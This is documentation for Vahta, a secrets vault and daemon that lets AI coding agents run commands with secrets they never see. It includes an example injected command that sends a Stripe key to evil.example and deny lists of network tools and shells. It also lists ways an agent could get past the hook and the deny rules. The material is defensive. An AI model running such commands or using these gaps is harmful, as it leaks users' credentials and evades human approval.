# The Vahta daemon: sessions, `vahta run` and the vault commands

Vahta keeps a project's secrets in an encrypted vault, `.vahta/vault.vht`, and
lets an agent *use* them without ever *seeing* them. The pieces that do that are
a small background process, the daemon, and the `vahta` commands that talk to it.

This page says what each command does, what you will see, and, at the end, what
Vahta does not protect against.

## The idea in one paragraph

You type the vault password, and any secret you store, in a **window the daemon
opens**, never in the terminal an agent is reading and never on a command line.
The agent runs `vahta run`; the **daemon** starts the command with the secrets in
its environment and sends the output back with the secrets taken out. The agent
gets an exit code and scrubbed output, and never a value.

## Commands

Every command that needs the password opens a **new terminal window** (never the
one you or the agent typed in) showing what is about to happen, then asks. If no
window can be opened (no display, no terminal found) the command fails and says
nothing was done.

| Command | What it does | Password |
|---|---|---|
| `vahta init` | Create `.vahta/` and the vault here. The recovery key is shown once, in the window. | new password, twice |
| `vahta add NAME [--tier session\|each-use] [--file FILENAME]` | Store a new secret. The value is typed in the window, hidden, twice. A name the vault already has is refused (exit 3). | yes |
| `vahta tier NAME session\|each-use` | Change a secret's tier without typing its value again. Same tier or an unknown name: refused (exit 3). | yes |
| `vahta reset NAME [--tier session\|each-use] [--file FILENAME]` | Replace the value of a secret the vault has, as when rotating it. It keeps its tier and kind unless the flags say otherwise. A name the vault does not have is refused (exit 3). | yes |
| `vahta remove NAME` | Remove a secret. | yes |
| `vahta import --ka PATH` / `--dotenv PATH` | Add the secrets of a ka vault or a `.env` file. The daemon reads the file itself. A name the vault already has refuses the whole import. | yes (and the ka password for `--ka`) |
| `vahta reveal NAME` | Show the value in the window until a key is pressed or 60 seconds pass. | yes |
| `vahta copy NAME` | Put the value on the clipboard; it is cleared after 30 seconds if it is unchanged. Needs `wl-copy`, `xclip`, `xsel`, `pbcopy` or `clip`. | yes |
| `vahta unlock [--secret NAME]... [--for DURATION] [--label TEXT]` | Open a **session** (below). | yes |
| `vahta lock [--all]` | End this project's sessions, or all of them. | no |
| `vahta sessions [--json]` / `vahta sessions kill ID` | List sessions, or end one and everything below it. | no |
| `vahta run [--secret NAME]... [--as NAME=VAR]... [--ask [--reason TEXT]] -- COMMAND` | Run a command with secrets in its environment. A secret with command rules only goes to commands they allow; `--ask` asks the person about one they do not. | only without a session |
| `vahta bind [NAME] [--allow RULE]... [--deny RULE]... [--clear] [--reason TEXT]` | Propose which commands may use a secret, or approve the rules in `vahta.toml`. The person approves in the window. | yes |
| `vahta delegate --secret NAME... [--for DURATION] -- COMMAND` | Give a sub-agent a narrower session. | no |
| `vahta output allow REF [--reason TEXT]` | Ask the person to show the agent what the hook cut out of a tool's output (see [hooks.md](hooks.md)). | only without a session |
| `vahta list`, `vahta check` | Names, kinds, tiers, classes and whether rules are approved; compare with `vahta.toml`. | no (they read the signed name index) |
| `vahta daemon run\|status\|stop\|restart` | The daemon itself. | no |

None of these takes a secret or the password as an argument or on standard input.
There is no flag for it, on purpose.

There is no `vahta set`: one command that adds or overwrites lets a mistyped
name replace a secret, or a rotation quietly create a second one. `vahta set`
says which of the two to use.

`vh` is the short name of `vahta`: the same program, so `vh run -- …` is
`vahta run -- …`.

### Exit codes

| Code | Meaning |
|---|---|
| 0 | done |
| the command's | `vahta run` and `vahta delegate` pass the command's exit code through (128 plus the signal for a command a signal ended) |
| 1 | the request failed |
| 2 | usage |
| 3 | **refused**, with a reason (see below) |
| 4 | the window was cancelled, or nobody answered |
| 5 | the daemon is not available |

A refusal is structured. With `--json` the answer names the kind and each name and
why, so an agent that made a mistake can rebuild the command:

```json
{"ok": false, "refused": {"kind": "each_use", "message": "...", "names": [{"name": "DB_PASSWORD", "why": "each_use"}]}}
```

## Tiers

A secret is **session** (the default) or **each-use**.

- A *session* secret can be held by a session, so `vahta run` can use it without a
  window while a session is open.
- An *each-use* secret needs the password **every time** and never enters a
  session. Use it for the few things you want a person to approve each time.

## Sessions

`vahta unlock` is meant to be called by the agent. A window opens and shows you the
project, the vault, the names, how long, and **which process the session belongs
to** (its name and pid). You read it and type the password. From then on, `vahta
run` from that process, and from everything it starts, needs no window.

- **Scope.** Without `--secret`, every session-tier secret in the project's vault.
  With `--secret A --secret B`, only those. Naming an each-use secret, or one that
  does not exist, refuses the *whole* request before any window opens (exit 3),
  and the refusal goes to the journal.
- **Length.** 30 minutes by default (`session_minutes` in `config.toml`);
  `--for 2h` (also `90s`, `1h30m`, a clock such as `1:30:00`) per unlock;
  `--for forever` until revoked.
- **Extension.** Two minutes before a session ends (halfway, for one shorter than
  four minutes) a window offers: extend by the session's last length (what it was opened
  for, or the last extension chosen), no, or
  another duration typed as `15m`, `1h30m` or `1:30:00` (up to a year, never
  `forever`). While a duration is typed the session is held open for up to two
  minutes. No password, because the keys are still in memory. With no answer the
  session ends at its deadline, and a new one needs the password.
- **The anchor.** A session belongs to an *anchor* process and everything it
  starts. The anchor is the nearest ancestor of the calling `vahta` that is not a
  shell or a wrapper (`bash`, `zsh`, `sudo`, `env`, `timeout`, ...), so Claude
  Code's `bash -c` anchors to `claude`. A shell sitting directly under a terminal,
  `sshd`, `login`, a `tmux` server or `systemd` is the anchor itself, so your own
  `vahta unlock` covers the shell you typed it in and nothing else. The anchor must
  be yours, above the lowest pid and more than two levels above init.
- **Role.** A session is a *runner*: it can `run` and nothing else. `reveal`,
  `copy`, `export` and every write need a fresh password.
- **Label.** `--label` lets the agent say why. It is shown in the window marked
  "from the agent, not verified", cleaned to one plain line of at most 200
  characters. What you approve is the list Vahta renders, not the label.
- **Ending.** At the deadline, when the anchor process exits, on `vahta lock` or
  `vahta sessions kill`, when the daemon stops, and (Linux, `lock_on_sleep`, on by
  default) when the machine suspends or the screen locks: through logind
  (`loginctl lock-session`, or a desktop that sets `LockedHint`, as GNOME and
  KDE do), or, under Hyprland, a lock screen such as hyprlock or Omarchy's.
  Ending a session also ends every session below it and overwrites its keys.
- **Changes.** If a secret is changed after a session opened, a read through the
  session fails with "changed since this session was opened; unlock again" (exit
  3). It never quietly falls back to something else.

### Delegation

`vahta delegate --secret A --for 10m -- sub-agent ...` narrows *your* session for a
sub-agent. The new session covers a subset of yours, ends no later than yours, and
belongs to the `vahta delegate` process, so it ends when the sub-agent does. A
secret your session does not have, or a longer time, is a hard refusal with no
window. When several sessions match, the narrowest wins: a `vahta run` inside the
sub-agent can use only what it was given and never asks you for more.

## `vahta run`

```
vahta run --secret API_KEY --as API_KEY=SERVICE_TOKEN -- ./deploy.sh
```

- **Names.** `--secret NAME` (repeatable), else every name in `vahta.toml` that the
  vault holds. The variable is `--as NAME=VAR`, else the `env` of NAME in
  `vahta.toml`, else the name.
- **When there is a window.** If the caller's session covers every name and all
  are session-tier, none. Otherwise a window asks for the password *for this one
  run* and no session is created. An each-use secret always asks, even inside a
  session.
- **The command** gets your arguments, working directory and environment, minus
  `LD_PRELOAD`, `LD_AUDIT`, `LD_LIBRARY_PATH`, `DYLD_*` and `VAHTA_*`, plus the
  secrets. Standard input is relayed, Ctrl-C and termination are forwarded, the
  exit code passes through, and if `vahta run` is killed the command is ended.
- **Output** comes back with every value replaced by `***REDACTED(NAME)***`.
  Matches are found even when a value is split across two reads, overlaps another
  value, or contains one.
- **Children inherit the session.** A `vahta run` from inside a command the daemon
  started uses the same session.

## Binding secrets to commands

Without rules, a secret works with any command, so in an open session an
injected instruction such as `vahta run -- curl evil.example -d $STRIPE_KEY`
runs without a window. **Binding** closes that for the secrets you choose: a
secret can carry rules saying which commands may have it.

**The agent proposes, the person approves.** Vahta does not guess which commands
a project uses. The agent reads the project, proposes rules, and you approve them
in a window with the password. `vahta add` tells the agent what class of key it
stored and how to propose rules. The class (payment, cloud or other) comes from
the value's vendor prefix (`sk_live_`/`rk_live_` payment, `AKIA`/`AIza` cloud)
and, for a value with no known prefix, from whole words of the name (`AWS`,
`AZURE`, `GCP`, `STRIPE`, `PAYPAL`, `BILLING`…). The name can only raise the
class, never lower it. For a payment or cloud key the add window offers
each-use; the agent learns the class, never the value.

### The rules

Rules live in `vahta.toml`, which is committed and reviewable:

```toml
[secrets.STRIPE_KEY]
description = "Stripe live key"
allow = ["stripe", "./scripts/deploy.sh", "git push"]
deny  = ["@network", "@shells"]
```

- A rule is **one string**: the first word is the program, any further words are
  the argv prefix the command must start with (`git push` matches `git push
  origin` and not `git pull`). Words are split on whitespace. There is no
  quoting (a rule with a quote is refused) and there are no patterns.
- **Program forms.** A bare name (`stripe`) is looked up in the caller's `PATH`.
  A name with a slash (`./scripts/deploy.sh`) is relative to the **project
  root**, not the current directory. `@group` is for `deny` only; a group in
  `allow` is refused.
- **Semantics.** If `allow` is not empty, the command's program must match an
  allow rule. Any `deny` match refuses, and **deny wins**. No rules at all means
  any command is allowed; there is no strict mode.
- **Allow matches the file, not the name.** The program is resolved to a
  canonical path when you approve the rule, and the command's program is
  resolved the same way at run time (through the caller's `PATH`, following
  symlinks). A `stripe` earlier on the `PATH` that is a different file is
  refused. What is checked is what runs: the daemon starts the resolved path,
  for every run, bound or not.
- **Deny matches the name.** The file name of the program, lower-cased, without
  `.exe`/`.cmd`/`.bat` and a trailing version (`python3.12` is `python`), and
  also the name the caller typed. A copy of `curl` in another directory is still
  caught. The groups are:

| Group | Programs |
|---|---|
| `@network` | curl, wget, nc, ncat, netcat, socat, http, https, xh, httpie, ssh, scp, sftp, rsync, ftp, telnet, aria2c, Invoke-WebRequest |
| `@shells` | sh, bash, zsh, fish, dash, ksh, csh, tcsh, pwsh, powershell, cmd, nu |
| `@interpreters` | python, node, deno, bun, ruby, perl, php, lua, osascript |

### The vault's copy is what counts

`vahta.toml` is a **proposal**: anyone who can push can edit it. The rules the
daemon enforces are the **approved copy inside the signed vault**. A change to
the file takes effect only after you approve it in a window with the password
(`vahta bind`). Until then `vahta list` shows `bound (toml differs)`,
`vahta check` fails with the names, and a refused run says the file's rules are
not approved.

### `vahta bind`

- `vahta bind NAME --allow stripe --deny @shells --reason "deploys use it"`
  opens one window: the secret's current rules and the proposed ones (the
  proposal **replaces** the current rules), where each allowed program resolves
  to, a warning for a file inside the project or a temp directory (the agent can
  change it) and for a shell or interpreter, and the agent's reason, shown
  marked as unverified. On **Approve** and the password it writes `vahta.toml`
  first, then the vault. `--clear` removes the rules.
- `vahta bind` with no name approves `vahta.toml` as written: the window shows
  what differs for each name, and one approval writes the vault.
- Nothing changes without the window and the password. An agent may call it; it
  only asks. It is refused (exit 3) for an unknown name or no vault.

### A command that is not on the list

`vahta run` with a command the rules do not allow is **refused with exit 3 and no
window**. The message names the rules and the fix. Run it again with `--ask` and
the person is asked:

```
vahta run --ask --reason "deploy needs the key" --secret STRIPE_KEY -- ./scripts/deploy.sh
```

The window shows the secrets, the command, the resolved program, the rules and
the reason. The choices:

- **Allow once**: the run goes on and nothing is stored. (In a session there is
  no second window; otherwise the run's own password window follows.)
- **No**, or closing the window: nothing runs, exit 4.
- **Add to the list**: asks for the password again, then adds the program (as
  typed, no arguments) to the secret's `allow`, in `vahta.toml` first and then the
  vault, and runs. **Not offered** for a command a `deny` rule matches (that can
  only be allowed once), or when the ask comes from a delegated session.

The journal records `run_refused` (with the resolved program, never the
arguments), `run_allowed_once` and `binding_added`.

### What binding does not do

- **`allow` is the guard; `deny` is a speed bump.** A program in no group, or a
  renamed copy of one under a name the caller does not type, gets past a deny
  list. Prefer allowing exactly what is needed.
- **Allowing a program that runs other programs allows everything.** Shells,
  interpreters and launchers (`env`, `sudo`, `xargs`, `timeout`, `nohup`, `npx`…)
  start whatever their arguments name, and both windows warn about them. A deny
  rule looks past a launcher (`env curl …` is denied by `@network`), but not into
  a shell string or a script.
- **An allowed script inside the project can be edited by the agent.** The rule
  names the file, not its contents. The window warns when the program is in the
  project or a temp directory.
- **An allowed program can itself pass the secret on.** `git push` with the key
  can send it anywhere that `git` is told to.
- The check and the start are two steps: a file replaced between them is not
  caught.

## The daemon

One runs per user, started on demand by the `vahta` commands (never by the agent
hook) and not a system service. It exits after 10 idle minutes (no sessions, no
connections). It listens on a Unix socket in a private runtime directory (a named
pipe only you can open, on Windows), and it knows who is calling from the
operating system, never from what the caller says.

If a newer `vahta` meets an older daemon with no sessions, the old one exits and a
new one starts. If it holds sessions, the command says so and points to `vahta
daemon restart` (which ends them).

On Linux the daemon is not dumpable and writes no core files, and it keeps every
key in memory that is wiped when it is dropped. Its memory is **not** locked
against swap: locking all of it makes the system refuse new threads once the
locked-memory limit is reached, and locking only the pages that hold keys is not
done yet. Use encrypted swap (or none) if a key paged to disk matters to you. A session keeps only the data keys of
the secrets it covers; the vault key is dropped right after the password is
checked.

### Configuration: `<config dir>/vahta/config.toml`

```toml
session_minutes = 30    # default length of `vahta unlock`
lock_on_sleep = true    # end sessions on suspend and screen lock (Linux)
lock_sources = ["logind", "hyprland"]   # which triggers; unset = all, [] = none
terminal = "kitty"      # the terminal the window opens in (Linux); empty = detect
idle_minutes = 10       # the daemon exits after this long with nothing to do
hook_output = "redact"  # or "observe": the hook only reports secrets in tool output
```

A misspelt key is an error, not a silent default. On Linux the window opens in
the first terminal that works: `VAHTA_TERMINAL` if set, else `terminal` from the
config, else `$TERMINAL`, else the first of the table Vahta carries that is
installed (your desktop's own first). Name yours with the flag that makes it run a
command if it is not found: `terminal = "alacritty -e"`.

### Lock triggers

`lock_on_sleep` ends sessions when something says the person has left. Each way
of finding out is a *lock source*; this build has two on Linux: `logind`
(suspend, `loginctl lock-session`, a desktop that sets `LockedHint`) and
`hyprland` (a lock screen on Hyprland, by asking the compositor). `lock_sources`
picks among them by name: unset means every source in the build, a list means
only those, `[]` means none. A name the build does not know is written to the
journal and ignored. The Hyprland source is the cargo feature `lock-hyprland`,
on by default; `cargo build --no-default-features` leaves it out.

**Any other locker, with no code.** `vahta lock --all` needs no password (ending
a session never needs one), so anything that can run a command when the screen
locks or the machine idles can be a trigger. Put it in the locker's own hook:
hypridle's `lock_cmd` (`lock_cmd = vahta lock --all; pidof hyprlock || hyprlock`),
`xss-lock -- sh -c 'vahta lock --all; your-locker'`, or a sway, i3 or Omarchy
hook.

**Adding a source (for maintainers).** Sources live in
`crates/daemon/src/lock/`, one file each. Write `lock/<name>.rs` with a type that
implements `LockSource`: a stable `name()`, and `run(self: Box<Self>, sink)`,
which runs in its own thread until `sink.stopping()`, or returns at once after
`sink.note("unavailable", why)` if it does not apply here. It calls
`sink.lock(why)` to end every session and journal the reason. `sink` is all it
gets: it cannot see sessions, keys or the prompt surface. Then add one line to
`sources()` in `lock/mod.rs`, behind the `cfg` that says where it applies (and a
cargo feature, if it should be optional). The core does not change.

### Files

- `.vahta/` in a project: the vault, its lock and its backups, with a `.gitignore`
  of `*`. `vahta.toml` (the committed list of names) sits beside it.
- `<data dir>/vahta/`: what this machine remembers about each vault (the pinned
  owner key and the highest generation seen, so a swapped or rolled-back vault is
  refused), and `journal.jsonl`.
- `journal.jsonl`, mode 0600: each line is a time, an event, the session and its
  parent, the vault, the secret *names*, the peer's program and pid, the result
  and reason, and use counts. **Never a value and never a password.**

The agent hook refuses to read, edit, write, move, copy, remove or redirect into
any `.vahta/` directory or `<data dir>/vahta/`, and says which path.

It also refuses `vahta reveal`, `vahta copy` and `vahta _surface` (and `vh …`)
from an agent, however they are spelled: a window on the screen can be
captured and the clipboard can be read, so these are for the person, in their
own terminal. `vahta setup --claude` writes the same commands into Claude
Code's `permissions.deny` as a second layer; Codex and Cursor have no command
deny list, so there the hook is the only layer.

The hook also cuts secrets out of what a tool returns before the model sees
it: the detector's likely finds, and, with the daemon running, every value it
holds for that agent. [hooks.md](hooks.md) says how, and how the agent asks the
person for what was cut.

Each refusal is also reported to the daemon, which journals it as
`hook_report`: what kind of thing the agent tried (a secret-shaped value and
the rule that found it, one of Vahta's files, a command for the person), never
the value or the command text. With no daemon running, the hook appends the
report to `<data dir>/vahta/hook-spool.jsonl` (mode 0600, at most 1 MiB; past
that new reports are dropped), and the next daemon journals and empties it.
Refusals of the person's own prompt are not reported. These reports are the
evidence for the injection alarm.

## What this does not protect against

Vahta is built so that an agent cannot *ask* for a secret. It cannot stop everything
an agent running as you could *do*. Read this before relying on it.

- **The command sees the secret.** The command `vahta run` starts has it in its
  environment, and can print it, send it somewhere, or write it to a file. The
  scrubber catches a value that appears in the output as it is; it does **not**
  catch one that is encoded (base64, URL-encoded, split by the program's own
  formatting). Run commands you trust with secrets you can afford to have used.
- **`/proc/<pid>/environ`.** On Linux, a process of the same user can read the
  environment of another of its processes. While a command that was given a secret
  runs, another process running as you (including an agent's other tools) can read
  it from there. The daemon's own memory is protected from that (not dumpable); a
  command it started is not.
- **Revocation is not recall.** Ending a session, or the daemon, stops *future*
  uses. It cannot take a value back from a command that is already running, nor
  from output that already left.
- **Same user.** Everything runs as you. A hostile process of yours that can
  attach to the daemon would be refused a session it has no password for, but it
  can run what you can run. The window is a terminal window; a program that can
  watch or type into your terminals can watch or type into it.
- **Command rules are narrower than they look.** See "What binding does not
  do": `allow` is the guard, `deny` only slows an agent down, and an allowed
  program can still pass a secret on.
- **No terminal for the command.** A command that needs a terminal gets pipes, not
  a terminal.
- **The anchor is a process, not a person.** A session covers the process it
  belongs to and everything it starts. If you unlock from inside an agent, the
  agent and its tools can use the secrets until the session ends.
- **Sleep and lock.** Ending sessions on suspend and screen lock is Linux only.
  Under Hyprland the lock screen is noticed within about two seconds, by asking
  the compositor while a session is open. A screen locker on another compositor
  that does not tell logind is not heard unless it runs `vahta lock --all` (see
  Lock triggers). macOS and Windows do not do it yet.
- **The hook is a speed bump.** The protection of Vahta's own files in the agent
  hook covers the common ways of reading or changing them (the read, edit and
  write tools, common shell readers, `rm`, `mv`, `cp`, redirections). It does not
  cover globs, `$VARS`, command substitution, interpreters (`python -c`), or a
  program that is handed a directory containing a vault. The vault's own
  encryption is what holds when the hook does not.
